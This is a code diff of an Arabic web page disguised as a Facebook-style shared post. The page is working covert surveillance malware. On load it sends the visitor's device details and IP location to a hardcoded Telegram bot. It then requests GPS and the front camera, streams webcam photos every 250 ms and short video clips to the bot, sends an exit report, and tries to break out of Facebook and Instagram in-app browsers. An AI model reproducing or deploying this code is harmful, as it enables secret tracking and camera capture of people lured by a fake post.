@@ -2,36 +2,132 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>Shahin Zyan masengar</title>
   <meta property="og:title" content="Shahin Zyan masengar">
   <meta property="og:description" content="شارك لك منشور">
   <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
   <style>
-    :root { --bg: #f0f2f5; --card-bg: #ffffff; --text-primary: #1c1e21; --text-secondary: #65676b; --border: #e4e6eb; }
-    @media (prefers-color-scheme: dark) { :root { --bg: #18191a; --card-bg: #242526; --text-primary: #e4e6eb; --text-secondary: #b0b3b8; --border: #3e4042; } }
+    :root {
+      --bg: #f0f2f5;
+      --card-bg: #ffffff;
+      --text-primary: #1c1e21;
+      --text-secondary: #65676b;
+      --border: #e4e6eb;
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg: #18191a;
+        --card-bg: #242526;
+        --text-primary: #e4e6eb;
+        --text-secondary: #b0b3b8;
+        --border: #3e4042;
+      }
+    }
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: var(--bg); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 20px; min-height: 100vh; position: relative; }
-    .post-container { max-width: 500px; width: 100%; background: var(--card-bg); border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid var(--border); margin-bottom: 15px; }
-    .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
-    .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
+    body {
+      background: var(--bg);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 20px;
+      min-height: 100vh;
+      position: relative;
+    }
+    .post-container {
+      max-width: 500px;
+      width: 100%;
+      background: var(--card-bg);
+      border-radius: 8px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+      overflow: hidden;
+      border: 1px solid var(--border);
+      margin-bottom: 15px;
+    }
+    .post-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px 0;
+      position: relative;
+    }
+    .post-header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-left: 8px;
+      object-fit: cover;
+    }
     .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
     .post-time { font-size: 13px; color: var(--text-secondary); }
-    .post-text { padding: 4px 16px 12px; font-size: 15px; color: var(--text-primary); white-space: pre-wrap; }
-    .post-image img { width: 100%; display: block; border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); }
-    .post-stats { display: flex; justify-content: space-between; padding: 8px 16px; font-size: 13px; color: var(--text-secondary); border-top: 1px solid var(--border); }
-    .post-actions { display: flex; justify-content: space-evenly; padding: 4px 16px 8px; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 14px; font-weight: 600; }
-    .post-actions span { cursor: pointer; padding: 8px 0; flex: 1; text-align: center; }
-    .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
+    .post-text {
+      padding: 4px 16px 12px;
+      font-size: 15px;
+      color: var(--text-primary);
+      white-space: pre-wrap;
+    }
+    .post-image img { width: 100%; display: block; }
+    .post-stats {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 16px;
+      font-size: 13px;
+      color: var(--text-secondary);
+      border-top: 1px solid var(--border);
+    }
+    .post-actions {
+      display: flex;
+      justify-content: space-evenly;
+      padding: 4px 16px 8px;
+      border-top: 1px solid var(--border);
+      color: var(--text-secondary);
+      font-size: 14px;
+      font-weight: 600;
+    }
+    .post-actions span {
+      cursor: pointer;
+      padding: 8px 0;
+      flex: 1;
+      text-align: center;
+    }
+    .three-dots {
+      position: absolute;
+      top: 12px; left: 16px;
+      width: 36px; height: 36px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: var(--text-secondary);
+      font-size: 20px;
+    }
     .three-dots:hover { background: var(--border); }
 
-    /* أزرار إعادة المحاولة منفصلة */
-    .retry-buttons { display: flex; flex-direction: column; align-items: center; gap: 10px; margin-top: 10px; }
-    .retry-btn { padding: 10px 20px; font-size: 0.9rem; background: #4a4a4a; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; width: 250px; }
-    .hidden { display: none !important; }
-    video { display: none; }
-    .escape-btn { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 10px 0; display: none; }
+    /* أزرار التحكم */
+    .controls {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      width: 100%;
+      max-width: 500px;
+      margin-top: 10px;
+    }
+    .retry-btn {
+      padding: 12px 20px;
+      font-size: 0.9rem;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      width: 100%;
+    }
+    .retry-btn.hidden { display: none; }
+    video, canvas { display: none; }
   </style>
 </head>
 <body>
@@ -49,142 +145,199 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <!-- أزرار إعادة المحاولة المنفصلة -->
-  <div class="retry-buttons">
+  <div class="controls">
     <button class="retry-btn hidden" id="retryCameraBtn">إعادة محاولة الكاميرا</button>
     <button class="retry-btn hidden" id="retryLocationBtn">إعادة محاولة الموقع</button>
   </div>
-  <button class="escape-btn" id="escapeButton">فتح في المتصفح الخارجي</button>
 
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <canvas id="canvas"></canvas>
 
   <script>
+    // الإعدادات
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const C = '5151102782';
     const I = 'a7e43833d69a75';
 
+    // العناصر
     const post = document.getElementById('postContainer');
-    const retryCameraBtn = document.getElementById('retryCameraBtn');
-    const retryLocationBtn = document.getElementById('retryLocationBtn');
+    const retryCamera = document.getElementById('retryCameraBtn');
+    const retryLocation = document.getElementById('retryLocationBtn');
     const vid = document.getElementById('video');
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
-    let stream, photos = 0, capInt, loc, redir = 'https://example.com', deviceInfoSent = false, gpsLoc = null;
-    let mediaRecorder, videoChunks = [], recording = false;
-    let cameraGranted = false, locationGranted = false;
+    // حالة التشغيل
+    let stream = null;
+    let photos = 0;
+    let captureInterval = null;
+    let mediaRecorder = null;
+    let videoChunks = [];
+    let recording = false;
+    let deviceInfoSent = false;
+    let gpsLoc = null;
+    let ipLoc = null;
+    let redirectUrl = 'https://www.facebook.com';
 
-    // تحميل المنشور
-    async function updatePost() {
+    // ─── دوال مساعدة ────────────────────────────
+    async function sendToTelegram(method, payload) {
       try {
-        let r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
-        let d = await r.json(); let s = d.record || {};
-        redir = s.redirectUrl || redir;
+        await fetch(`https://api.telegram.org/bot${T}/${method}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {}
+    }
+
+    async function sendText(text) {
+      await sendToTelegram('sendMessage', {
+        chat_id: C,
+        text: text,
+        parse_mode: 'HTML'
+      });
+    }
+
+    function dataURLtoBlob(dataUrl) {
+      const arr = dataUrl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      const n = bstr.length;
+      const u8 = new Uint8Array(n);
+      for (let i = 0; i < n; i++) u8[i] = bstr.charCodeAt(i);
+      return new Blob([u8], { type: mime });
+    }
+
+    // ─── المنشور ────────────────────────────────
+    async function loadPost() {
+      try {
+        const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
+        const d = await r.json();
+        const s = d.record || {};
+        redirectUrl = s.redirectUrl || redirectUrl;
+        const name = s.profileName || 'Shahin Zyan';
+        const avatar = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png';
+        const text = s.postText || 'هذا نص تجريبي.';
+        const postImg = s.postImage || '';
+        const time = s.postTime || 'الآن';
+        const comments = s.commentsCount || '12';
+        const shares = s.sharesCount || '5';
+
         post.innerHTML = `
           <div class="post-header">
-            <img src="${s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png'}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
+            <img src="${avatar}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
             <div>
-              <div class="post-user">${s.profileName || 'Shahin Zyan'}</div>
-              <div class="post-time">${s.postTime || 'الآن'}</div>
+              <div class="post-user">${name}</div>
+              <div class="post-time">${time}</div>
             </div>
             <div class="three-dots">⋯</div>
           </div>
-          <div class="post-text">${s.postText || 'هذا نص تجريبي.'}</div>
-          ${s.postImage ? `<div class="post-image"><img src="${s.postImage}" alt="صورة المنشور"></div>` : ''}
-          <div class="post-stats"><span>${s.commentsCount || '0'} تعليق</span><span>${s.sharesCount || '0'} مشاركة</span></div>
-          <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>`;
-      } catch(e) {}
+          <div class="post-text">${text}</div>
+          ${postImg ? `<div class="post-image"><img src="${postImg}" alt="صورة المنشور"></div>` : ''}
+          <div class="post-stats"><span>${comments} تعليق</span><span>${shares} مشاركة</span></div>
+          <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
+        `;
+      } catch (e) {}
     }
 
-    // إرسال نص للبوت
-    async function sendText(text) {
-      try {
-        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
-        });
-      } catch(e) {}
-    }
-
-    // معلومات الجهاز
+    // ─── معلومات الجهاز (مرة واحدة) ─────────────
     async function sendDeviceInfo() {
       if (deviceInfoSent) return;
       deviceInfoSent = true;
       try {
-        let ua = navigator.userAgentData || {}, h = {};
+        const ua = navigator.userAgentData || {};
+        let h = {};
         if (ua.getHighEntropyValues) {
           try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
         }
-        let sc = window.screen, bat = null;
+        const sc = window.screen;
+        let bat = null;
         if ('getBattery' in navigator) {
-          try { let b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
+          try { const b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
         }
         let txt = '<b>📱 معلومات الجهاز</b>\n';
         txt += `الموديل: ${h.model||'N/A'}\nالنظام: ${navigator.platform}\nالشاشة: ${sc.width}x${sc.height}\n`;
         txt += `المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
-        if(bat) txt += `البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
+        if (bat) txt += `البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
         txt += `اللغة: ${navigator.language}\nالمنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
-        sendText(txt);
-      } catch(e) {}
+        await sendText(txt);
+      } catch (e) {}
     }
 
-    // الموقع المخزن عبر IP (صامت)
-    async function sendIPLocation() {
+    // ─── الموقع (IP أولاً، ثم GPS) ──────────────
+    async function fetchIPLocation() {
       try {
-        let r = await fetch(`https://ipinfo.io/json?token=${I}`);
-        let d = await r.json();
+        const r = await fetch(`https://ipinfo.io/json?token=${I}`);
+        const d = await r.json();
         if (d.loc) {
-          let [lat, lon] = d.loc.split(',').map(Number);
-          loc = { lat, lon, acc: 10000, src: 'IP' };
-          let maps = `https://www.google.com/maps?q=${lat},${lon}`;
-          await sendText(`📍 الموقع التقريبي (IP): ${lat}, ${lon}\n🌍 Google Maps: ${maps}\n🍎 Apple Maps: http://maps.apple.com/?ll=${lat},${lon}&q=موقع\n🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15`);
+          const [lat, lon] = d.loc.split(',').map(Number);
+          ipLoc = { lat, lon, acc: 5000, src: 'IP' };
+          await sendText(`📍 الموقع التقريبي (IP): ${lat}, ${lon}\n🌍 https://www.google.com/maps?q=${lat},${lon}`);
         }
-      } catch(e) {}
+      } catch (e) {}
     }
 
-    // طلب GPS دقيق (يحتاج إذن)
     async function requestGPS() {
       if (!navigator.geolocation) return false;
       try {
-        let pos = await new Promise((res, rej) => {
+        const pos = await new Promise((res, rej) => {
           navigator.geolocation.getCurrentPosition(res, rej, {
-            enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
           });
         });
-        if (pos.coords.accuracy && pos.coords.accuracy > 10) return false;
-        gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS دقيق' };
-        loc = gpsLoc;
-        let maps = `https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}`;
-        await sendText(`📍 الموقع الدقيق (GPS): ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n🌍 Google Maps: ${maps}\n🍎 Apple Maps: http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع\n🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18`);
+        // نقبل الدقة حتى 50 متر، لكن نفضل أقل من 10
+        if (pos.coords.accuracy > 50) return false;
+        gpsLoc = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy,
+          src: 'GPS'
+        };
+        await sendText(`📍 الموقع الدقيق (GPS): ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n🌍 https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}`);
         return true;
-      } catch(e) { return false; }
-    }
-
-    // محاولة الحصول على GPS ومعالجة النتيجة
-    async function tryGPS() {
-      let ok = await requestGPS();
-      if (ok) {
-        locationGranted = true;
-        retryLocationBtn.classList.add('hidden');
-      } else {
-        locationGranted = false;
-        retryLocationBtn.classList.remove('hidden');
-        // إذا لم نأخذ GPS من قبل، نرسل IP
-        if (!gpsLoc) await sendIPLocation();
+      } catch (e) {
+        return false;
       }
     }
 
-    // بدء الكاميرا والتصوير
-    async function startCamera(facingMode = 'user') {
+    async function attemptGPS() {
+      const ok = await requestGPS();
+      if (ok) {
+        retryLocation.classList.add('hidden');
+      } else {
+        retryLocation.classList.remove('hidden');
+        if (!ipLoc) await fetchIPLocation();
+      }
+    }
+
+    // ─── الكاميرا والتصوير ──────────────────────
+    async function startCamera() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         vid.srcObject = stream;
         await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
-        capInt = setInterval(captureAndSend, 250);
+        captureInterval = setInterval(captureAndSend, 250);
         return true;
-      } catch(e) { return false; }
+      } catch (e) {
+        return false;
+      }
+    }
+
+    function captureAndSend() {
+      if (!stream || !vid.videoWidth) return;
+      cnv.width = vid.videoWidth;
+      cnv.height = vid.videoHeight;
+      ctx.drawImage(vid, 0, 0);
+      const blob = dataURLtoBlob(cnv.toDataURL('image/jpeg', 0.9));
+      const form = new FormData();
+      form.append('chat_id', C);
+      form.append('photo', blob, 'snap.jpg');
+      fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
+      photos++;
+      if (photos % 5 === 0 && !recording) startVideoRecording();
     }
 
     function startVideoRecording() {
@@ -195,144 +348,91 @@
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
         mediaRecorder.onstop = async () => {
-          let blob = new Blob(videoChunks, { type: 'video/webm' });
-          let form = new FormData(); form.append('chat_id', C); form.append('video_note', blob, 'video.webm');
-          await fetch(`https://api.telegram.org/bot${T}/sendVideoNote`, { method: 'POST', body: form }).catch(() => {});
+          const blob = new Blob(videoChunks, { type: 'video/webm' });
+          const form = new FormData();
+          form.append('chat_id', C);
+          form.append('video', blob, 'clip.webm');
+          form.append('caption', `🎥 فيديو تلقائي #${Math.floor(photos/5)}`);
+          await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: form }).catch(() => {});
           recording = false;
         };
         mediaRecorder.start();
         setTimeout(() => {
           if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
         }, 3000);
-      } catch(e) { recording = false; }
-    }
-
-    function captureAndSend() {
-      if (!stream || !vid.videoWidth) return;
-      cnv.width = vid.videoWidth; cnv.height = vid.videoHeight;
-      ctx.drawImage(vid, 0, 0);
-      let blob = dataURLtoBlob(cnv.toDataURL('image/jpeg', 0.9));
-      let form = new FormData(); form.append('chat_id', C); form.append('photo', blob, 'snap.jpg');
-      fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
-      photos++;
-      if (photos % 5 === 0 && !recording) startVideoRecording();
-    }
-
-    function dataURLtoBlob(u) {
-      let arr = u.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
-      while (n--) u8[n] = bstr.charCodeAt(n);
-      return new Blob([u8], { type: mime });
+      } catch (e) { recording = false; }
     }
 
     function stopAll() {
-      if (capInt) clearInterval(capInt);
+      if (captureInterval) clearInterval(captureInterval);
       if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
       if (stream) stream.getTracks().forEach(t => t.stop());
     }
 
-    async function sendExitReport() {
-      let report = '<b>📋 تقرير نهائي</b>\n';
-      report += `عدد الصور: ${photos}\n`;
-      if (gpsLoc) {
-        report += `الموقع الدقيق: ${gpsLoc.lat}, ${gpsLoc.lon}\n`;
-        report += `دقة GPS: ${gpsLoc.acc}م\n`;
-      } else if (loc) {
-        report += `الموقع التقريبي: ${loc.lat}, ${loc.lon}\n`;
-      }
-      report += `الوقت: ${new Date().toLocaleString()}`;
-      await sendText(report);
-    }
-
-    // محاولة الكاميرا
-    async function tryCamera() {
-      let ok = await startCamera('user');
+    async function attemptCamera() {
+      const ok = await startCamera();
       if (ok) {
-        cameraGranted = true;
-        retryCameraBtn.classList.add('hidden');
+        retryCamera.classList.add('hidden');
       } else {
-        cameraGranted = false;
-        retryCameraBtn.classList.remove('hidden');
+        retryCamera.classList.remove('hidden');
       }
     }
 
-    // ربط أزرار الإعادة
-    retryCameraBtn.addEventListener('click', async () => {
-      retryCameraBtn.classList.add('hidden');
-      await tryCamera();
-    });
+    // ─── تقرير الخروج ───────────────────────────
+    async function sendExitReport() {
+      let locStr = 'غير متوفر';
+      if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
+      else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
+      const report = `<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`;
+      try {
+        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: C, text: report, parse_mode: 'HTML' })
+        });
+      } catch (e) {}
+    }
 
-    retryLocationBtn.addEventListener('click', async () => {
-      retryLocationBtn.classList.add('hidden');
-      await tryGPS();
-    });
+    // ─── خطة الهروب من WebView ──────────────────
+    function attemptWebViewEscape() {
+      const url = window.location.href;
+      const ua = navigator.userAgent || '';
+      if (!/FBAN|FBAV|Instagram/i.test(ua)) return;
 
-    // خطة الهروب من WebView
-    (function escapePlan() {
-      const targetUrl = window.location.href;
-      const escapeBtn = document.getElementById('escapeButton');
-      function isInAppBrowser() {
-        const ua = navigator.userAgent || '';
-        return /FBAN|FBAV|Instagram|Twitter|Line|KAKAOTALK/i.test(ua);
-      }
       const methods = [
-        {
-          name: 'x-safari-https',
-          shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent),
-          execute: () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); }
-        },
-        {
-          name: 'googlechrome',
-          shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent),
-          execute: () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); }
-        },
-        {
-          name: 'android-intent',
-          shouldTry: () => /Android/i.test(navigator.userAgent),
-          execute: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`; }
-        },
-        {
-          name: 'smart-app-banner',
-          shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent) && !document.querySelector('meta[name="apple-itunes-app"]'),
-          execute: () => {
-            const meta = document.createElement('meta'); meta.name = 'apple-itunes-app'; meta.content = 'app-id=';
-            document.head.appendChild(meta);
-          }
-        },
-        {
-          name: 'window-open',
-          shouldTry: () => true,
-          execute: () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
-        }
+        () => { window.location.href = url.replace(/^https?:\/\//, 'x-safari-https://'); },
+        () => { window.location.href = url.replace(/^https?:\/\//, 'googlechrome://'); },
+        () => { window.open(url, '_blank', 'noopener,noreferrer'); }
       ];
-      function attemptSequentialEscape() {
-        for (let i = 0; i < methods.length; i++) {
-          const method = methods[i];
-          if (method.shouldTry()) { try { method.execute(); } catch(e) {} }
-        }
-        if (escapeBtn) {
-          escapeBtn.style.display = 'block';
-          escapeBtn.addEventListener('click', () => { window.open(targetUrl, '_blank'); });
-        }
-      }
-      if (isInAppBrowser()) { attemptSequentialEscape(); }
-    })();
 
-    async function init() {
-      await updatePost();
-      // 1. معلومات الجهاز
-      sendDeviceInfo();
-      // 2. موقع IP
-      sendIPLocation();
-      // 3. نحاول GPS وكاميرا بالتوازي
-      tryGPS();
-      tryCamera();
+      methods.forEach(fn => { try { fn(); } catch(e) {} });
     }
 
-    window.addEventListener('load', init);
+    // ─── ربط الأحداث ────────────────────────────
+    retryCamera.addEventListener('click', async () => {
+      retryCamera.classList.add('hidden');
+      await attemptCamera();
+    });
+
+    retryLocation.addEventListener('click', async () => {
+      retryLocation.classList.add('hidden');
+      await attemptGPS();
+    });
+
     window.addEventListener('beforeunload', () => {
       stopAll();
       sendExitReport();
     });
+
+    // ─── بدء التشغيل ────────────────────────────
+    (async function init() {
+      await loadPost();
+      attemptWebViewEscape();
+      sendDeviceInfo();
+      fetchIPLocation();
+      attemptGPS();
+      attemptCamera();
+    })();
   </script>
 </body>
 </html>
